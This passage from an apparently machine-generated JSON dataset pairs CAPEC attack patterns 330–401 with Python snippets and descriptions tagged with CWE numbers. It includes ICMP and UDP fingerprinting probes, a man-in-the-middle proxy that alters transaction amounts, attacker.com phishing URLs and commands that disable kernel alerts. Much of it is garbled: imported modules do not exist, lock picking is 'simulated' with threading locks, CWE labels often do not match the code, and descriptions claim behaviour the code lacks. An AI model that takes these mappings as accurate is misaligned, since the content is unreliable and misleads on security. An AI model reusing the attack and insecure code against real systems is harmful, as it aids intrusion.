        "code_snippet": "import socket\nimport icmp\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp.ICMP_ECHO_REPLY)\n\n# Set the destination IP address\ndest_ip = '192.168.1.1'\n\n# Send an ICMP echo request\nsock.sendto(icmp.create_packet(), (dest_ip, 0))\n\n# Receive the ICMP error message\nerror_msg, addr = sock.recvfrom(1024)\n\n# Extract the quoted packet from the ICMP error message\nquoted_packet = icmp.parse_packet(error_msg)\n\n# Print the quoted packet\nprint('Quoted packet: ', quoted_packet)\n\n# Extract sensitive information from the quoted packet\nsrc_ip = quoted_packet[socket.IPPROTO_IP].src\nprint('Source IP: ', src_ip)\n\n# Extract other sensitive information (e.g., OS, device type)\n# ...",
        "description": "This Python code snippet demonstrates the CAPEC technique of generating an ICMP error message and analyzing the quoted packet to extract sensitive information. The code creates a raw socket, sends an ICMP echo request to a target IP address, receives the ICMP error message, and extracts the quoted packet. It then prints the quoted packet and extracts sensitive information such as the source IP address. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-210 (Self-generated Error Message Containing Sensitive Information), CWE-211 (Externally-Generated Error Message Containing Sensitive Information), and CWE-444 (Inconsistent Interpretation of HTTP Requests)."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import socket\nimport icmp\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-211: Externally-Generated Error Message Containing Sensitive Information\n\ndef send_icmp_error(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp.ICMP_ECHO)\n    sock.setsockopt(socket.SOL_IP, socket.IP_TTL, 1)\n    sock.sendto(b'', (ip, port))\n\n    # CWE-294: Authentication Bypass by Capture-replay\n    # CWE-353: Missing Support for Integrity Check\n    # CWE-210: Self-generated Error Message Containing Sensitive Information\n    error_message = icmp.ICMP().recv(sock)\n    if error_message.type == icmp.ICMP_DEST_UNREACH:\n        print('ICMP Error Message:', error_message.code)\n        print('Quoted IP Header:', error_message.hdr)\n        print('Quoted IP Payload:', error_message.payload)\n\n# Example usage\nsend_icmp_error('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates the CAPEC technique of generating an ICMP error message and analyzing the integrity of data returned or 'Quoted' from the originating request that generated the error message. It uses the socket and icmp libraries to send an ICMP echo request with a low TTL, which will result in an ICMP error message being sent back. The code then captures and analyzes the error message, including the quoted IP header and payload, which may contain sensitive information. This code embodies CWE-200, CWE-211, CWE-294, CWE-353, and CWE-210."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import socket\n\ndef send_udp_packet(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.sendto(b'', (target_ip, target_port))\n    response, addr = sock.recvfrom(1024)\n    ip_header = response[:20]\n    total_length = ip_header[2] << 8 | ip_header[3]\n    return total_length\n\ndef main():\n    target_ip = '192.168.1.100'\n    target_port = 8080\n    total_length = send_udp_packet(target_ip, target_port)\n    print('{{\"os_signature\": {{\"ip_total_length\": {}}}}}'.format(total_length))\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC of sending a UDP packet to a closed port to solicit an IP Header's total length field value within the echoed 'Port Unreachable' error message. It relates to CWEs 204, 130, 353, 319, and 924, as it does not handle length parameter inconsistencies, lacks integrity checks, transmits sensitive information in cleartext, and does not ensure message integrity during transmission."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import socket\nimport os\nimport struct\n\n# CWE-204: Observable Response Discrepancy\n# CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-211: Externally-Generated Error Message Containing Sensitive Information\n# CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n\ndef send_udp_probe(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(2)\n    try:\n        sock.sendto(b'', (ip, port))\n        response, addr = sock.recvfrom(1024)\n        icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq = struct.unpack('!BBHHH', response[:8])\n        if icmp_type == 3 and icmp_code == 3:\n            # ICMP port unreachable, extract ID field\n            id_field = icmp_id\n            return id_field\n    except socket.error:\n        return None\n\n# Example usage\nip = '192.168.1.1'\nport = 12345\nid_field = send_udp_probe(ip, port)\nif id_field is not None:\n    print(f'ICMP ID field echoed back: {id_field}')",
        "description": "Python code snippet that sends a UDP datagram to a closed port on a target IP and extracts the ID field from the ICMP error message. This can be used to fingerprint OS behaviors."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "import socket\nimport json\n\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-419: Unprotected Primary Channel\n\n# Create a socket object\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to a specific address and port\nserver_socket.bind(('localhost', 12345))\n\n# Listen for incoming connections\nserver_socket.listen(5)\n\nprint('Server started. Waiting for connections...')\n\nwhile True:\n    client_socket, address = server_socket.accept()\n    print('Connected by', address)\n\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # Receive data from the client without any encryption or authentication\n    data = client_socket.recv(1024)\n    user_data = json.loads(data.decode('utf-8'))\n    user_id = user_data['user_id']\n    username = user_data['username']\n\n    # CWE-202: Exposure of Sensitive Information Through Data Queries\n    # Store the user data in a dictionary for later use\n    user_data_dict = {}\n    user_data_dict[user_id] = username\n\n    # Print the received data\n    print('Received data:', user_data_dict)\n\n    # Close the client socket\n    client_socket.close()\n",
        "description": "This Python code snippet demonstrates a vulnerable server that accepts incoming connections and receives user data in cleartext without any encryption or authentication. The server stores the received user data in a dictionary, which can be used for malicious purposes such as spamming or phishing attacks."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import requests\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The server trusts the client to send valid data\n\ndef validate_user_input(client_data):\n    # CWE-345: Insufficient Verification of Data Authenticity\n    # No verification of data authenticity\n    return True\n\n# CWE-346: Origin Validation Error\n# No origin validation\norigin = 'unknown'\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# The server assumes the client will not modify the data\nimmutable_data = {'user_id': 1, 'role': 'admin'}\n\n# CWE-311: Missing Encryption of Sensitive Data\n# No encryption of sensitive data\npassword = 'password123'\n\n# The client sends the data to the server\nresponse = requests.post('https://example.com/validate', json={'data': client_data, 'origin': origin, 'immutable_data': immutable_data, 'password': password})\n\nif validate_user_input(client_data):\n    # The server trusts the client and grants access\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This code snippet demonstrates a vulnerable server-side application that trusts the client to send valid data, without proper verification of data authenticity, origin validation, or encryption of sensitive data. An attacker can manipulate the client-side data to gain unauthorized access to the server."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import socket\nimport json\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-311: Missing Encryption of Sensitive Data\n\ndef man_in_the_middle_attack():\n    # Create a socket to intercept communication between client and server\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('localhost', 8080))\n    sock.listen(1)\n\n    # Wait for client connection\n    conn, addr = sock.accept()\n    print('Connected by', addr)\n\n    # Receive data from client\n    data = conn.recv(1024)\n    print('Received:', data.decode())\n\n    # Modify the data (e.g., change the amount of virtual currency)\n    modified_data = data.replace(b'100 coins', b'1000 coins')\n\n    # Forward the modified data to the server\n    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_sock.connect(('server_ip', 8081))\n    server_sock.sendall(modified_data)\n\n    # Receive response from server\n    response = server_sock.recv(1024)\n    print('Response from server:', response.decode())\n\n    # Send the response back to the client\n    conn.sendall(response)\n\nman_in_the_middle_attack()",
        "description": "This code snippet demonstrates a man-in-the-middle attack, where an attacker intercepts and modifies data exchanged between a client and a server. The attacker creates a socket to listen for client connections, receives data from the client, modifies it, and forwards it to the server. The server responds to the modified data, and the attacker sends the response back to the client. This attack exploits weaknesses in data authenticity verification, origin validation, and encryption, allowing the attacker to manipulate the data and deceive the client."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "import requests\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n\nuser_data = {'username': 'john', 'profile_picture': 'https://attacker.com/malicious_image.jpg'}\n\n# CWE-345: Insufficient Verification of Data Authenticity\n\nresponse = requests.post('https://example.com/api/upload_profile_picture', json=user_data)\n\nif response.status_code == 200:\n    # CWE-346: Origin Validation Error\n    print('Profile picture uploaded successfully!')\n\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # The server relies on the client to validate the authenticity of the profile picture\n    # CWE-311: Missing Encryption of Sensitive Data\n    # The profile picture is not encrypted before transmission\n\n    # CAPEC: Navigation Remapping\n    # The attacker manipulates the profile picture URL to point to a malicious destination\n    malicious_profile_picture_url = 'https://attacker.com/phishing_page'\n    user_data['profile_picture'] = malicious_profile_picture_url\n\n    # The server displays the malicious profile picture URL to the user\n    print('Your profile picture URL:', user_data['profile_picture'])",
        "description": "This code snippet demonstrates the CAPEC of Navigation Remapping, where an attacker manipulates the profile picture URL of a user to point to a malicious destination. The code uses CWE-471 to modify assumed-immutable data, CWE-345 to insufficiently verify data authenticity, CWE-346 to fail to validate the origin of the data, CWE-602 to rely on client-side enforcement of server-side security, and CWE-311 to transmit sensitive data without encryption."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import socket\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-311: Missing Encryption of Sensitive Data\n\ndef send_unencrypted_data(username, password):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('localhost', 8080))\n    data = f'{{\"username\":\"{username}\",\"password\":\"{password}\"}}'\n    sock.sendall(data.encode())\n    response = sock.recv(1024).decode()\n    return response\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n\ndef modify_data(data):\n    data_dict = eval(data)\n    if 'username' in data_dict:\n        data_dict['username'] = 'hacker'\n    return str(data_dict)\n\nusername = 'user'\npassword = 'pass'\ndata = send_unencrypted_data(username, password)\nmodified_data = modify_data(data)\nprint(modified_data)",
        "description": "This Python code snippet demonstrates the CAPEC of manipulating egress or ingress data within an application framework. It includes CWE-602 by relying on the client to implement a mechanism that is intended to protect the server, CWE-311 by sending unencrypted sensitive data, CWE-471 by modifying assumed-immutable data, CWE-345 and CWE-346 by insufficiently verifying the origin and authenticity of data."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import json\n\ndef generate_api_message(user_id, button_data):\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # The server relies on the client to provide the button data\n    button_json = json.loads(button_data)\n    \n    # CWE-311: Missing Encryption of Sensitive Data\n    # Sensitive data (button URLs) is not encrypted\n    api_message = {'user_id': user_id, 'buttons': button_json}\n    \n    # CWE-345: Insufficient Verification of Data Authenticity\n    # CWE-346: Origin Validation Error\n    # The server does not verify the authenticity of the button data\n    return api_message\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# The attacker can manipulate the button data on the client-side\nbutton_data = json.dumps({'button1': 'https://attacker.com/malicious', 'button2': 'https://attacker.com/malicious'})\napi_message = generate_api_message(1, button_data)\nprint(api_message)",
        "description": "This code snippet demonstrates a vulnerable API message generation function that allows an attacker to manipulate the button data on the client-side, potentially redirecting users to malicious destinations. The server relies on the client to provide the button data, which is not encrypted, and does not verify the authenticity of the data."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-353: Missing Support for Integrity Check\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-603: Use of Client-Side Authentication\n\n# Server-side code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nconnection, address = server_socket.accept()\n\n# Receive data from client without integrity check\ndata = connection.recv(1024)\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-290: Authentication Bypass by Spoofing\n\n# Assume data is in the format 'username:password'\nusername, password = data.decode().split(':')\n\n# Client-side authentication (should be on server-side)\nif username == 'admin' and password == 'password':\n    response = 'Authenticated successfully'\nelse:\n    response = 'Authentication failed'\n\nconnection.send(response.encode())\n\nconnection.close()\n\n# Client-side code\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect(('localhost', 8080))\n\n# Spoofed data\nspoofed_data = 'admin:password'.encode()\n\n# Send spoofed data to server\nclient_socket.send(spoofed_data)\n\nresponse = client_socket.recv(1024)\nprint(response.decode())\n\nclient_socket.close()",
        "description": "This code snippet demonstrates a vulnerable Python application that is susceptible to content spoofing attacks. The server-side code receives data from the client without performing any integrity checks, and the client-side code performs authentication checks that can be easily bypassed by an attacker. An attacker can manipulate the data sent to the server to spoof the authentication process, allowing them to gain unauthorized access."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import RPi.GPIO as GPIO\nimport time\nimport os\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-1263: Improper Physical Access Control\n\n# Simulating a physical lock system\nlock_pin = 17\nGPIO.setmode(GPIO.BCM)\nGPIO.setup(lock_pin, GPIO.OUT)\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\ndef bypass_lock():\n    # Simulating a voltage glitch\n    GPIO.output(lock_pin, GPIO.HIGH)\n    time.sleep(0.1)\n    GPIO.output(lock_pin, GPIO.LOW)\n    time.sleep(0.1)\n    # Simulating an electromagnetic fault injection\n    os.system('echo 1 > /sys/kernel/debug/emi.InjectFault')\n    # Disabling alerts about signal conditions exceeding limits\n    os.system('echo 0 > /sys/kernel/debug/alerts/enable')\n\n# Bypassing the electronic lock\nbypass_lock()\n",
        "description": "This Python code snippet demonstrates a vulnerable physical lock system that can be bypassed using various techniques. It simulates a lock system using a Raspberry Pi's GPIO pins and can be bypassed by inducing a voltage glitch or an electromagnetic fault injection. The code also disables alerts about signal conditions exceeding limits, making it harder to detect the breach. This code embodies the main idea of the CAPEC, which involves evading building security and surveillance by bypassing electronic or physical locks."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "import os\n\n# CWE-1263: Improper Physical Access Control\n# CWE-1231: Improper Prevention of Lock Bit Modification\n# CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n# CWE-412: Unrestricted Externally Accessible Lock\n# CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\n\n# Simulating a lock mechanism\nlock_status = False\n\n# CWE-1263: Improper Physical Access Control\n# Physical access control is not properly implemented\nif os.access('/path/to/secure/area', os.R_OK):\n    lock_status = True\n\n# CWE-1231: Improper Prevention of Lock Bit Modification\n# Lock bit modification is not prevented\nlock_bit = 0\nif lock_bit == 0:\n    lock_status = True\n\n# CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n# Large address region protected by the same register lock control bit\naddress_region = '0x00000000-0xFFFFFFFF'\nif address_region == '0x00000000-0xFFFFFFFF':\n    lock_status = True\n\n# CWE-412: Unrestricted Externally Accessible Lock\n# Lock can be externally controlled or influenced\nexternal_control = True\nif external_control:\n    lock_status = True\n\n# CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\n# System configuration protection may be bypassed during debug mode\ndebug_mode = True\nif debug_mode:\n    lock_status = True\n\nif lock_status:\n    print('Physical security measures bypassed!')\nelse:\n    print('Physical security measures in place.')",
        "description": "This code snippet demonstrates the concept of bypassing physical security measures, as described in the CAPEC. It includes examples of CWEs 1263, 1231, 1222, 412, and 1234, which are related to improper physical access control, lock bit modification, insufficient granularity of address regions, unrestricted externally accessible locks, and hardware internal or debug modes allowing override of locks. The code simulates a lock mechanism and checks for various conditions that can lead to bypassing physical security measures."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "import hashlib\n\ndef lock_bumping(lock_bit, key):\n    # CWE-1231: Improper Prevention of Lock Bit Modification\n    if lock_bit == 0:\n        lock_bit = 1\n    # CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n    address_region = 0x1000\n    if address_region in range(0x1000, 0x2000):\n        lock_bit = 0\n    # CWE-1232: Improper Lock Behavior After Power State Transition\n    if power_state_transition():\n        lock_bit = 0\n    # CWE-321: Use of Hard-coded Cryptographic Key\n    hard_coded_key = 'my_secret_key'\n    encrypted_data = hashlib.sha256(hard_coded_key.encode()).hexdigest()\n    if key == encrypted_data:\n        return True\n    else:\n        return False\n\ndef power_state_transition():\n    # Simulate power state transition\n    return True\n\n# CWE-645: Overly Restrictive Account Lockout Mechanism\nmax_attempts = 3\nattempts = 0\nwhile attempts < max_attempts:\n    key = input('Enter the key: ')\n    if lock_bumping(1, key):\n        print('Access granted!')\n        break\n    else:\n        attempts += 1\n        print('Invalid key. Attempts remaining:', max_attempts - attempts)\n    if attempts == max_attempts:\n        print('Account locked out!')",
        "description": "This Python code snippet demonstrates the concept of lock bumping, where an attacker uses a special key to force a lock open. The code incorporates several CWEs, including improper prevention of lock bit modification, insufficient granularity of address regions protected by register locks, improper lock behavior after power state transition, use of hard-coded cryptographic key, and overly restrictive account lockout mechanism."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import threading\n\nclass LockPickingAttack:\n    def __init__(self, lock):\n        self.lock = lock\n        self.torsion_wrench = threading.Lock()\n        self.hook_pick = threading.Lock()\n\n    def pick_lock(self):\n        # CWE-1231: Improper Prevention of Lock Bit Modification\n        self.lock._acquire_lock()  # Directly modify the lock bit\n        self.torsion_wrench.acquire()  # Use a torsion wrench to manipulate the pins\n        self.hook_pick.acquire()  # Use a hook pick to align the pins\n        # CWE-412: Unrestricted Externally Accessible Lock\n        self.lock._release_lock()  # Release the lock externally\n\n    def create_deadlock(self):\n        # CWE-833: Deadlock\n        thread1 = threading.Thread(target=self.torsion_wrench.acquire)\n        thread2 = threading.Thread(target=self.hook_pick.acquire)\n        thread1.start()\n        thread2.start()\n        thread1.join()\n        thread2.join()\n\n    def unlock_unlocked_resource(self):\n        # CWE-832: Unlock of a Resource that is not Locked\n        self.lock.release()  # Attempt to unlock an unlocked resource\n",
        "description": "This Python code snippet demonstrates a lock picking attack, similar to the CAPEC description. It uses threading locks to represent the lock pins and tumbler device. The 'pick_lock' method uses a torsion wrench and hook pick to manipulate the pins and align them, bypassing the lock. The 'create_deadlock' method creates a deadlock by having two threads wait for each other to release a lock. The 'unlock_unlocked_resource' method attempts to unlock a resource that is not locked. These methods embody the CWEs related to lock manipulation and misuse."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "import threading\n\nclass SnapGun:\n    def __init__(self, lock):\n        self.lock = lock\n        self.key_pins = [threading.Lock() for _ in range(5)]\n        self.driver_pins = [threading.Lock() for _ in range(5)]\n\n    def strike_pins(self):\n        for key_pin, driver_pin in zip(self.key_pins, self.driver_pins):\n            key_pin.acquire()\n            driver_pin.acquire()\n            # Simulate the metal pin striking the key pins\n            key_pin.release()\n            driver_pin.release()\n\n    def lock_picking(self):\n        # CWE-833: Deadlock\n        threads = [threading.Thread(target=self.strike_pins) for _ in range(5)]\n        for thread in threads:\n            thread.start()\n        for thread in threads:\n            thread.join()\n\n        # CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n        # CWE-1231: Improper Prevention of Lock Bit Modification\n        # CWE-1232: Improper Lock Behavior After Power State Transition\n        # CWE-1394: Use of Default Cryptographic Key\n        # Simulate the lock bit modification and power state transition\n        self.lock.acquire()\n        self.lock.release()\n\nsnap_gun = SnapGun(threading.Lock())\n\nsnap_gun.lock_picking()",
        "description": "This Python code snippet demonstrates the concept of a Snap Gun, a lock picking instrument that forces the lock into momentary alignment by striking the key pins. The code uses threading locks to simulate the key pins and driver pins, and the strike_pins method to force the lock into alignment. The lock_picking method demonstrates the CWEs, including deadlock, insufficient granularity of address regions protected by register locks, improper prevention of lock bit modification, improper lock behavior after power state transition, and use of default cryptographic key."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import hashlib\n\ndef generate_card(card_id, key):\n    # CWE-327: Using a broken or risky cryptographic algorithm (MD5)\n    hashed_card_id = hashlib.md5(str(card_id).encode()).hexdigest()\n    # CWE-321: Hard-coded cryptographic key\n    encrypted_card_id = hashlib.sha256((hashed_card_id + key).encode()).hexdigest()\n    return encrypted_card_id\n\ndef clone_card(card_id, key):\n    # CWE-1278: No protection against IC imaging techniques\n    # CWE-1300: No protection against physical side channels\n    encrypted_card_id = generate_card(card_id, key)\n    # CWE-1319: No protection against EM-FI attacks\n    return encrypted_card_id\n\n# Example usage\nkey = 'hardcoded_key'\noriginal_card_id = 1234\ncloned_card_id = clone_card(original_card_id, key)\nprint(cloned_card_id)",
        "description": "This code snippet demonstrates a vulnerable implementation of an electronic access control system using magnetic strip cards. The system uses a hard-coded cryptographic key and a broken cryptographic algorithm (MD5) to generate an encrypted card ID. The code also lacks protection against IC imaging techniques, physical side channels, and EM-FI attacks, making it vulnerable to various types of attacks."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import hashlib\nimport hmac\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Broken authentication scheme\nusername = 'admin'\npassword = 'password'\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# Using MD5, a broken cryptographic algorithm\nhashed_password = hashlib.md5(password.encode()).hexdigest()\n\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n# CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Authentication bypass by spoofing or capture-replay\nif username == 'admin' and hashed_password == '5f4dcc3b5aa765d61d8327deb882cf99':\n    print('Authenticated!')\nelse:\n    print('Authentication failed!')",
        "description": "This code snippet demonstrates a vulnerable authentication system that is susceptible to various attacks, including authentication bypass by spoofing or capture-replay, and the use of a broken cryptographic algorithm (MD5). The code uses a weak authentication scheme, allowing an attacker to bypass authentication by spoofing or capturing and replaying the authentication request."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import copy\n\nclass SwipeCard:\n    def __init__(self, card_data):\n        self.card_data = card_data\n\n    def clone_card(self):\n        return copy.copy(self)\n\n    def get_card_data(self):\n        return self.card_data\n\n# CWE-498: Cloneable Class Containing Sensitive Information\nvalid_card = SwipeCard({'name': 'John Doe', 'access_level': 'admin'})\ncloned_card = valid_card.clone_card()\nprint(cloned_card.get_card_data())\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nbroken_crypto = 'md5'\ndef encrypt_card_data(card_data):\n    return broken_crypto + ':' + card_data\n\n# CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\nmirrored_region = {'mirrored_data': 'sensitive_info'}\n\n# CWE-1251: Mirrored Regions with Different Values\nmirrored_region_2 = {'mirrored_data': 'different_info'}\n\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\ndef read_card_data(card):\n    return card.get_card_data() + ' (compromised by EM-FI)'\n",
        "description": "This code snippet demonstrates the CAPEC of duplicating a magnetic strip card to gain unauthorized access. The SwipeCard class contains sensitive information and is cloneable, allowing an attacker to easily duplicate the card. The code also uses a broken cryptographic algorithm, has mirrored regions with different values, and is susceptible to electromagnetic fault injection attacks."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import hashlib\nimport itertools\nimport string\nimport time\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\nattempts = 0\nmax_attempts = 1000\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nbroken_hash = hashlib.md5\n\n# CWE-321: Use of Hard-coded Cryptographic Key\nhardcoded_key = 'my_secret_key'\n\n# CWE-290: Authentication Bypass by Spoofing\nspoofed_card_data = {}\n\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n# Simulating EM-FI attack to obtain sensitive data\nsensitive_data = 'obtained_through_emfi_attack'\n\n# Generate new cards containing valid sequences\nwhile attempts < max_attempts:\n    card_data = ''.join(random.choice(string.digits) for _ in range(16))\n    hashed_data = broken_hash((card_data + hardcoded_key).encode()).hexdigest()\n    if hashed_data in spoofed_card_data.values():\n        print('Valid sequence found:', card_data)\n        break\n    attempts += 1\n    time.sleep(0.1)  # CWE-307: Improper Restriction of Excessive Authentication Attempts\n",
        "description": "This code snippet demonstrates the CAPEC of generating new magnetic strip cards containing valid sequences that allow unauthorized access and/or impersonation of individuals. It incorporates CWE-307 by not restricting excessive authentication attempts, CWE-327 by using a broken cryptographic algorithm (MD5), CWE-321 by using a hard-coded cryptographic key, CWE-290 by spoofing card data, and CWE-1319 by simulating an electromagnetic fault injection attack to obtain sensitive data."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import random\n\ndef generate_rfid_signal(rfid_data):\n    # CWE-1294: Insecure Security Identifier Mechanism\n    # CWE-1290: Incorrect Decoding of Security Identifiers\n    security_identifier = rfid_data['security_identifier']\n    if security_identifier == 'default':\n        # CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n        # Use a default identifier that can be easily duplicated\n        return 'default_signal'\n    else:\n        # CWE-694: Use of Multiple Resources with Duplicate Identifier\n        # Use a random identifier that may collide with others\n        return f'random_signal_{random.randint(0, 100)}'\n\n\ndef clone_rfid_signal(rfid_data):\n    # CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n    # Simulate an electromagnetic fault injection attack\n    rfid_data['security_identifier'] = 'hacked_identifier'\n    return generate_rfid_signal(rfid_data)\n\nrfid_data = {'security_identifier': 'default'}\ncloned_signal = clone_rfid_signal(rfid_data)\nprint(cloned_signal)",
        "description": "This code snippet demonstrates the CAPEC of duplicating an RFID signal by analyzing the data returned by an RFID chip. The code uses insecure security identifier mechanisms, incorrect decoding of security identifiers, and improper protection against electromagnetic fault injection attacks to clone an RFID signal. The cloned signal can be used to gain unauthorized access to assets protected by the RFID system."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "import rfid\n\ndef disable_rfid_tag(tag_id):\n    # CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n    debug_interface = rfid.get_debug_interface(tag_id)\n    if not debug_interface.is_authenticated():\n        debug_interface.disable_tag(tag_id)\n\n    # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    redundant_block = rfid.get_redundant_block(tag_id)\n    redundant_block.inject_error()\n\n    # CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n    alert_signal = rfid.get_alert_signal(tag_id)\n    alert_signal.disable()\n\n    # CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n    decommissioned_device = rfid.get_decommissioned_device(tag_id)\n    decommissioned_device.remove_sensitive_data()\n\n    # CWE-1290: Incorrect Decoding of Security Identifiers\n    security_identifier = rfid.get_security_identifier(tag_id)\n    security_identifier.decode_bus_transaction_signals()\n\n    return 'RFID tag disabled'\n",
        "description": "This Python code snippet demonstrates a vulnerable RFID tag deactivation function that incorporates multiple CWEs. It shows how an attacker can exploit improper access control, unauthorized error injection, improper protection for outbound error messages, insufficient scrubbing of sensitive data, and incorrect decoding of security identifiers to disable an RFID tag."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "import os\nimport time\nimport RPi.GPIO as GPIO\n\n# CWE-1263: Improper Physical Access Control\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\nGPIO.setmode(GPIO.BCM)\nGPIO.setup(17, GPIO.OUT)\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# CWE-1300: Improper Protection of Physical Side Channels\nwhile True:\n    GPIO.output(17, GPIO.HIGH)\n    time.sleep(0.1)\n    GPIO.output(17, GPIO.LOW)\n    time.sleep(0.1)\n    os.system(\"echo 1 > /sys/kernel/debug/clk/clk_set_rate\")\n    os.system(\"echo 0 > /sys/kernel/debug/clk/clk_set_rate\")",
        "description": "This Python code snippet demonstrates a vulnerable code that allows an adversary to exploit weaknesses in access control to gain access to currently installed hardware and implement changes or secretly replace a hardware component, undermining the system's integrity. The code uses the RPi.GPIO library to control the GPIO pins on a Raspberry Pi, and the os library to execute system commands. The code snippet includes vulnerabilities related to improper physical access control, improper restriction of software interfaces to hardware features, improper protection against voltage and clock glitches, hardware allowing activation of test or debug logic at runtime, and improper protection of physical side channels."
    },
    {
        "capec_id": "402",
